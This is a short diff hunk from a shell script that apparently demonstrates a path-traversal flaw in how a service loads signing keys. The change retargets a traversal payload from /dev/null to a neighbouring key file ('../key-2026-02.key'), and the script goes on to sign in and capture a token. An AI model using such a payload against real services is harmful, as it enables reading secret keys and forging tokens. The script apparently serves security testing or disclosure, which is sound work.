@@ -15,7 +15,7 @@ JAR="$(mktemp)"; trap 'rm -f "$JAR"' EXIT
 
 # Extra '..' segments are harmless once the path is already at the root, so a
 # single payload works regardless of how deep KEY_DIR is.
-TRAVERSAL='../../../../../../../../../../dev/null'
+TRAVERSAL='../key-2026-02.key'
 
 echo "== 1. sign in and capture a genuine token =="
 "${HTTP[@]}" -c "$JAR" -o /dev/null -X POST \
